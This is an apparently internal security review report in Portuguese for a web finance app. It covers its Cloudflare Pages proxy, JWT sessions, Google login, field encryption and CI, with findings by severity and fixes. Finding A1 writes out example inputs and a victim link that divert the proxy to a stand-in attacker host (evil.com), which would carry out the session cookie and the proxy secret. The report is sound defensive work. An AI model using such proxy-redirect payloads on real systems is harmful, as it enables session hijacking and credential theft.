# Relatório de segurança — 2026-10-15

Escopo: login, autenticação/sessão, autorização (isolamento entre usuários), proteção e criptografia de dados, proxy do Cloudflare Pages, frontend, IA e cadeia de dependências. Revisão manual do código no commit `6d3d362` (pós S1–S13 do [plano de segurança](plano-seguranca.md)), com `npm audit --omit=dev` (0 vulnerabilidades em backend e frontend) e teste do cálculo de URL do proxy no Node.

**Atualização (2026-10-15):** A1 e M1 corrigidos nas entregas S14 e S15 do [plano de segurança](plano-seguranca.md).

Não foi feito: teste dinâmico em produção, pentest, revisão do painel do Render/Cloudflare/Atlas/Google Cloud.

---

## Resumo

| # | Severidade | Achado | Onde |
|---|---|---|---|
| A1 | **Alta** — ✅ corrigido (S14) | Proxy `/api` pode ser desviado para outro host, levando o cookie de sessão e o `PROXY_SHARED_SECRET` | `frontend/functions/api/[[path]].ts:33-35` |
| M1 | Média — ✅ corrigido (S15) | `JWT_SECRET` sem checagem de força nem validação no boot | `backend/src/modules/auth/auth.service.ts:28-32` |
| M2 | Média | Excluir conta, zerar, restaurar e exportar dados não exigem login recente | `auth.routes.ts`, `backup.routes.ts` |
| M3 | Média | "Sair deste dispositivo" não invalida o token no servidor | `auth.controller.ts` (`logout`) |
| M4 | Média | Limites só em memória: zeram a cada restart; limite de IA por tenant contornável com várias contas Google | `rate-limit.middleware.ts`, `onboarding.routes.ts` |
| B1 | Baixa | Cadastro aberto a qualquer conta Google | `auth.service.ts` (`findOrCreateUser`) |
| B2 | Baixa | `jwtVerify` sem `algorithms`/`issuer`/`audience`; ID token do Google sem `nonce` | `auth.service.ts` |
| B3 | Baixa | Dados pessoais fora da criptografia de campo | ver detalhe |
| B4 | Baixa | `errorHandler` loga o erro inteiro (pode levar dado pessoal ao log do Render) | `error-handler.ts:44` |
| B5 | Baixa | Sem rotação de `ENCRYPTION_KEY`; chave única, sem cópia gerenciada | `field-crypto.ts` |
| B6 | Baixa | `ENCRYPTED_FIELDS` e `encryptedFields` dos repositórios sem teste de consistência | `migrate-encrypt-fields.ts` |
| I1 | Info | Actions do CI por tag (`@v4`, `@v2`) e imagem `semgrep/semgrep` sem versão | `.github/workflows/*.yml` |
| I2 | Info | Ações de deploy do plano ainda pendentes + configuração de contas/painéis | fora do código |

---

## Achados

### A1 — Proxy `/api` desviável para outro host (Alta) — corrigido na S14

```ts
const path = Array.isArray(segments) ? segments.join('/') : (segments ?? '');
const targetUrl = new URL(`/${path}`, env.API_ORIGIN);
```

Se o caminho começar com barra (ou barra invertida/tab, que o parser de URL trata como barra), `/${path}` vira `//host`, que é uma URL relativa ao protocolo — o `API_ORIGIN` é ignorado. Verificado no Node:

```
"/evil.com/x"  -> https://evil.com/x
"\t/evil.com"  -> https://evil.com/
```

A função repassa **todos** os cabeçalhos do navegador (inclusive `Cookie`) e acrescenta `x-proxy-secret`. Cenário: a vítima abre um link `https://<app>/api//evil.com/` — navegação GET de topo, o cookie `SameSite=Lax` é enviado — e o servidor do atacante recebe o JWT de sessão (acesso total à conta por até 24h) e o segredo do proxy (permite forjar IP e furar o limite por IP).

**A confirmar:** se o runtime do Pages entrega o segmento vazio em `params.path` para `/api//evil.com` (ou decodifica `%09`/`%5C`). Mesmo que não entregue hoje, a correção é barata e elimina a dependência desse detalhe.

**Correção:** montar a URL sem resolução relativa e conferir a origem:

```ts
const base = new URL(env.API_ORIGIN);
const targetUrl = new URL(base);
targetUrl.pathname = '/' + segmentList.map(encodeURIComponent).join('/');
targetUrl.search = incomingUrl.search;
if (targetUrl.origin !== base.origin) return new Response('Bad request', { status: 400 });
```

Complementos: repassar só os cabeçalhos necessários (lista permitida) e testar o proxy com `//`, `\`, `%2F`, `%5C`, `%09`.

### M1 — `JWT_SECRET` sem validação — corrigido na S15

O segredo só é lido na primeira assinatura/verificação; ausente, o servidor sobe e falha no login. Não há tamanho mínimo, e o `.env.example` traz `troque-por-um-segredo-aleatorio-longo` — se esse valor (ou algo curto) for parar em produção, qualquer pessoa pode assinar sessões válidas. Ao contrário da `ENCRYPTION_KEY`, não há trava de produção.

**Correção:** em `bootstrap()`, junto de `assertEncryptionConfigured()`, exigir `JWT_SECRET` com ≥ 32 bytes e diferente do valor de exemplo quando `NODE_ENV=production`. Usar um segredo distinto entre dev e produção.

### M2 — Ações críticas sem reautenticação

Com um cookie roubado (XSS futuro, A1, máquina compartilhada), é possível, sem nenhuma confirmação adicional: `GET /backup/export` (todo o histórico financeiro em claro), `POST /backup/import`/`/backup/reset` (sobrescrever/zerar) e `DELETE /auth/account` (apagar tudo, irreversível). A auditoria registra, mas não impede.

**Correção:** exigir sessão recente para essas rotas — p.ex. `iat` com menos de 10 min, senão `401 auth.reauthRequired` e o frontend pede o botão do Google de novo (gera um `idToken` novo e uma sessão nova).

### M3 — Logout local não revoga o token

`POST /auth/logout` só apaga o cookie do navegador. Uma cópia do JWT continua válida até expirar (24h). "Sair de todos" resolve, mas derruba todos os aparelhos. É o trade-off da D1; registrar como risco aceito ou adotar um `jti` por sessão com lista de revogação (coleção com TTL de 24h) consultada junto do `sessionVersion`.

### M4 — Limites em memória

- Os contadores vivem no processo: todo restart (deploy, ou o Render free dormindo após inatividade) zera tudo, inclusive o limite **diário** do chat de IA.
- O limite da IA é por tenant; como qualquer conta Google cria um tenant (B1), um atacante com várias contas multiplica o custo do provedor.
- Mais de uma instância divide os contadores.

**Correção:** um teto global diário de chamadas/tokens de IA (orçamento) e contadores persistidos no Mongo (coleção com índice TTL) para login, IA e importações. Definir também limite de gasto no painel da Anthropic/OpenAI.

### B1 — Cadastro aberto

Qualquer conta Google com e-mail verificado vira usuário. Para um app ainda sem pentest (Ações de deploy), considerar uma lista de e-mails permitidos (`ALLOWED_EMAILS`) até a abertura oficial.

### B2 — Endurecimento do JWT e do login Google

- `jwtVerify(token, secret)` sem `{ algorithms: ['HS256'] }`. O `jose` já recusa algoritmos incompatíveis com chave simétrica (não há "alg none"), mas fixar é barato. Incluir também `iss`/`aud` próprios na emissão e na verificação.
- ID token do Google sem `nonce`: um ID token vazado (válido ~1h) pode ser trocado por sessão. Risco baixo; o GSI aceita `nonce` na inicialização.
- Conta identificada por e-mail + `providerId`: correto (o `sub` também é conferido).

### B3 — Dados pessoais fora da criptografia de campo

Por decisão (D8): valores; nomes de contas, cartões e categorias (podem conter nome de banco ou da pessoa); `payload` do rascunho do onboarding (pode conter descrições de lançamentos até a confirmação); `userAgent` no `audit_log`. O Atlas cifra em repouso, então o risco é de acesso indevido ao banco (credencial do Atlas/backup do Mongo). Reavaliar ao menos o `payload` do rascunho.

### B4 — Log de erro inesperado completo

`console.error('[Unhandled Error]', error)` pode carregar o documento que causou o erro (ex.: chave duplicada do driver). Logar `name`, `message` saneada, `code` e stack, sem `keyValue`/`errInfo`.

### B5 — Gestão da `ENCRYPTION_KEY`

Uma chave, só no env do Render, sem rotação (`v1` reserva espaço para `v2`). Guardar cópia num gerenciador de senhas/cofre com acesso restrito e documentar o procedimento de rotação antes do uso comercial. Perda da chave = perda de descrições, e-mails e conversas.

### B6 — Listas de campos criptografados

`ENCRYPTED_FIELDS` da migração e os `encryptedFields` dos repositórios precisam andar juntos e nada garante isso. Um teste que instancie os repositórios e compare as listas evita que um campo novo fique em texto puro (regra do `CLAUDE.md`).

### I1 — Cadeia de suprimentos do CI

`actions/checkout@v4`, `gitleaks/gitleaks-action@v2` e `semgrep/semgrep` (latest) mudam sem revisão. Fixar por SHA/digest e deixar o Dependabot atualizar.

### I2 — Fora do código (pendente)

Do plano: `PROXY_SHARED_SECRET` (Render + Cloudflare), `ENCRYPTION_KEY`, `NODE_ENV=production`, `CORS_ORIGIN`, `VITE_LEGAL_*`, revisão jurídica, proteção da `main`, Dependabot, ZAP baseline. Acrescentar:

- **MFA** nas contas Google (dona do OAuth client), GitHub, Render, Cloudflare e Atlas — quem invade uma delas tem os dados e as chaves.
- **Atlas:** usuário do banco com permissão só no banco da aplicação; acesso de rede restrito (o Render free não tem IP fixo — se estiver `0.0.0.0/0`, a senha forte é a única barreira).
- **Provedor de IA:** confirmar retenção de dados/uso para treino na conta e que a Política de Privacidade cita o operador e a transferência internacional.
- **Google Cloud:** origens JavaScript autorizadas do OAuth client só com o domínio de produção (e localhost em dev, num client separado).

---

## O que está bem feito

- **Sessão:** cookie `httpOnly`, `Secure` em produção, `SameSite=Lax`, 24h absolutas, revogação global por `sessionVersion`, checagem de usuário existente a cada requisição.
- **Login:** assinatura do Google verificada via JWKS com `issuer` e `audience`; `email_verified` obrigatório; conflito de provedor tratado; limite por IP; tentativas falhas auditadas.
- **CSRF:** cabeçalho `X-Requested-With` obrigatório em métodos que alteram estado + CORS restrito + Lax. Nenhuma rota GET tem efeito destrutivo.
- **Isolamento entre usuários:** todo acesso passa por `MongoStore` com `{ id, tenantId }`; o `tenantId` vem só da sessão; restauração de backup recarimba o `tenantId`; Zod remove campos desconhecidos (sem mass assignment de `tenantId`); tools da IA recebem o tenant do contexto, não do modelo. Não encontrei IDOR.
- **Injection:** sem `$where`/`$regex` com entrada do usuário; filtro de chaves `$`/`__proto__` em corpo e query; CSV com escape de fórmula.
- **Criptografia:** AES-256-GCM com IV aleatório, tag de 16 bytes explícita, subchaves por HKDF, índice cego HMAC para o e-mail; produção não sobe sem chave.
- **LGPD:** consentimento versionado bloqueando dados no backend, exclusão completa com anonimização da auditoria, retenção de 90 dias.
- **Cabeçalhos:** helmet na API (CSP `default-src 'none'`), CSP/HSTS/`frame-ancestors 'none'` no Pages; frontend sem `dangerouslySetInnerHTML`, sem token em `localStorage`, cache do React Query limpo no logout.
- **Logs:** sem corpo nem query string; log da IA sem conteúdo nem identificadores.
- **Repositório:** `.env` ignorado, Gitleaks no histórico, Semgrep, `npm audit` sem vulnerabilidades em produção.

---

## Ordem sugerida

1. **A1** (proxy) — correção pequena, maior risco.
2. **M1** (trava do `JWT_SECRET`) e **I2** (MFA, Atlas, env vars de deploy).
3. **M2** (reautenticação para ações críticas).
4. **M4** (teto global da IA + limites persistidos) e **B1** (lista de e-mails, se for abrir para terceiros antes do pentest).
5. Baixas e informativas conforme couber.
